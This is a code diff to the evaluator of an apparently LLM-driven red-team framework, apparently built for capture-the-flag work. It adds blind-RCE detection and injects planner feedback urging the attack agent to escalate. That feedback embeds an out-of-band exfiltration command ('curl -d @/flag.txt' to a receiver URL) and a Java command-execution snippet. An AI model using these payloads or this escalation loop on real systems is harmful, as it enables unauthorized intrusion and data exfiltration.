@@ -38,6 +38,20 @@ _SUCCESS_SIGNALS: list[re.Pattern] = [
     re.compile(r"<script>[^<]{0,200}</script>", re.IGNORECASE),
 ]
 
+# 无回显 RCE 判定：步骤 ok=True 但 stdout 实质为空
+_BLANK_STDOUT_RE = re.compile(r"^\s*$")
+
+_BLIND_RCE_FEEDBACK = (
+    "检测到命令可能已执行但无回显 (Blind RCE)。请立即停止单纯更换命令！"
+    "必须升级战术：\n"
+    "1. 优先使用 SDK 中的 `redteam_sdk.OOBReceiver` 进行带外数据提取 (OOB)，"
+    "例如：`oob=OOBReceiver(port=8765); oob.start(); "
+    "# payload 改为 curl -d @/flag.txt {oob.url}`\n"
+    "2. 若在 Java/Python 等语言上下文中，使用代码级别的文件流读取（如 Java "
+    "`new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A').next()`）；\n"
+    "3. 尝试在 shell 命令末尾追加 `2>&1` 将错误流合并到标准输出。"
+)
+
 
 # ────────────────────────────────────────────────────────────────
 # System Prompt
@@ -94,6 +108,13 @@ EVAL_SYSTEM = """你是 Co-RedTeam 评估智能体（Evaluation Agent），对�
 6. ⚠️ 部分成功：
    有实质输出但未满足任何 expected_outcome → repro_success=false，confidence=0.3，
    guidance 必须给出具体修复方案
+
+7. 🔴 最高优先级规则 — Blind RCE 降级（凌驾于其他规则之上）：
+   若有步骤 ok=True（exit_code=0）但该步骤 stdout 实质为空（空白符/空字符串），
+   且未检测到 flag 或强成功信号：
+   → repro_success=false，confidence ≤ 0.6（绝对禁止 ≥ 0.9），should_continue=true
+   → feedback_for_planner 必须包含 OOB 战术升级指引（OOBReceiver / 文件流读取 / 2>&1）
+   → 禁止因"exit_code=0"就断定攻击成功！exit_code=0 只能说明命令被接受，不代表有回显。
 
 【analysis 三段论填写规则（必须严格执行）】：
 - what_happened：逐步引用真实数据（HTTP状态码、响应体片段、错误类型、OOB 内容）
@@ -181,6 +202,20 @@ def _detect_success_signal(text: str) -> str:
     return ""
 
 
+def _detect_blind_rce(step_results: list[dict[str, Any]]) -> bool:
+    """Return True when at least one step succeeded (ok=True) but produced no
+    meaningful stdout — the classic Blind-RCE symptom."""
+    found_ok = False
+    for sr in step_results:
+        res = sr.get("result") or {}
+        if res.get("ok"):
+            found_ok = True
+            stdout = res.get("stdout", "")
+            if not _BLANK_STDOUT_RE.match(stdout):
+                return False  # at least one ok step has real output → not blind
+    return found_ok  # all ok steps had blank stdout
+
+
 # ────────────────────────────────────────────────────────────────
 # Mock 评估（无 LLM 时）
 # ────────────────────────────────────────────────────────────────
@@ -215,6 +250,7 @@ def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: di
     flag = _detect_flag(all_stdouts)
     signal = _detect_success_signal(all_stdouts) if not flag else ""
     all_ok = all((r.get("result") or {}).get("ok") for r in results)
+    blind_rce = _detect_blind_rce(results) if not flag and not signal else False
 
     if flag:
         success, confidence = True, 0.95
@@ -222,6 +258,9 @@ def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: di
     elif signal:
         success, confidence = True, 0.75
         what_happened = f"检测到攻击成功信号：{signal}"
+    elif blind_rce:
+        success, confidence = False, 0.5
+        what_happened = "步骤退出码为 0（ok=True）但 stdout 全部为空，疑似 Blind RCE：命令已执行但无回显。"
     elif not all_stdouts.strip():
         success, confidence = False, 0.1
         what_happened = "所有步骤 stdout 均为空，无法判断攻击结果。"
@@ -232,6 +271,10 @@ def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: di
         success, confidence = False, 0.3
         what_happened = "部分步骤失败，未检测到成功信号。"
 
+    blind_rce_feedback = _BLIND_RCE_FEEDBACK if blind_rce else (
+        "若失败：拆分命令、增加探测步骤；若成功：固化可复用 payload 到技术记忆。"
+    )
+
     return {
         "version": 1,
         "repro_success": success,
@@ -239,11 +282,14 @@ def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: di
         "analysis": {
             "what_happened": what_happened,
             "vs_expectation": "MOCK 模式：基于本地正则检测，未进行语义分析。",
-            "guidance": "启用 LLM 以获得详细的三段论分析和可操作建议。",
+            "guidance": (
+                _BLIND_RCE_FEEDBACK if blind_rce
+                else "启用 LLM 以获得详细的三段论分析和可操作建议。"
+            ),
         },
         "summary": what_happened,
-        "feedback_for_planner": "若失败：拆分命令、增加探测步骤；若成功：固化可复用 payload 到技术记忆。",
-        "should_continue": not success,
+        "feedback_for_planner": blind_rce_feedback,
+        "should_continue": not success or blind_rce,
         "memory_patch": {},
     }
 
@@ -270,8 +316,9 @@ def run_evaluator(
         (r.get("result") or {}).get("stdout", "")
         for r in clean_exec_out.get("step_results") or []
     )
-    pre_flag   = _detect_flag(all_stdouts)
-    pre_signal = _detect_success_signal(all_stdouts) if not pre_flag else ""
+    pre_flag    = _detect_flag(all_stdouts)
+    pre_signal  = _detect_success_signal(all_stdouts) if not pre_flag else ""
+    pre_blind   = _detect_blind_rce(clean_exec_out.get("step_results") or []) if not pre_flag and not pre_signal else False
 
     # ── 3. Mock 模式 ────────────────────────────────
     if settings.mock_llm or llm is None:
@@ -300,6 +347,13 @@ def run_evaluator(
             f"\n\n【⚠️ 本地预检测】检测到强攻击成功信号：{pre_signal[:80]}\n"
             f"请在评估时将此信号纳入 repro_success 判定（应为 true）。"
         )
+    elif pre_blind:
+        pre_detection_note = (
+            f"\n\n【⚠️ 本地预检测 — Blind RCE 疑似】有步骤 ok=True 但 stdout 全部为空。\n"
+            f"这是 Blind RCE 的典型特征：命令已执行，但输出未回显到 HTTP 响应。\n"
+            f"判定规则：confidence 不得超过 0.6，repro_success=false，should_continue=true。\n"
+            f"feedback_for_planner 必须包含以下内容：{_BLIND_RCE_FEEDBACK}"
+        )
 
     user_payload = {
         "confirmed_vuln": confirmed,
@@ -322,6 +376,23 @@ def run_evaluator(
             fb["analysis"].get("what_happened", "") +
             f"（本地强制覆写：检测到 flag {pre_flag}）"
         )
+    elif pre_blind:
+        # Blind RCE：强制降级，防止 LLM 虚报高置信度
+        fb["repro_success"] = False
+        fb["should_continue"] = True
+        if fb.get("confidence", 0) >= 0.9:
+            fb["confidence"] = 0.5
+        fb.setdefault("analysis", {})
+        fb["analysis"]["what_happened"] = (
+            fb["analysis"].get("what_happened", "")
+            + "（本地强制覆写：步骤 ok=True 但 stdout 全部为空，疑似 Blind RCE）"
+        )
+        # 确保 feedback_for_planner 包含 OOB 战术指引
+        existing_fb = fb.get("feedback_for_planner", "")
+        if "OOBReceiver" not in existing_fb:
+            fb["feedback_for_planner"] = _BLIND_RCE_FEEDBACK + (
+                f"\n\n（原 LLM 反馈：{existing_fb}）" if existing_fb else ""
+            )
     elif not all_stdouts.strip() and fb.get("repro_success"):
         # 所有 stdout 为空，强制失败
         fb["repro_success"] = False
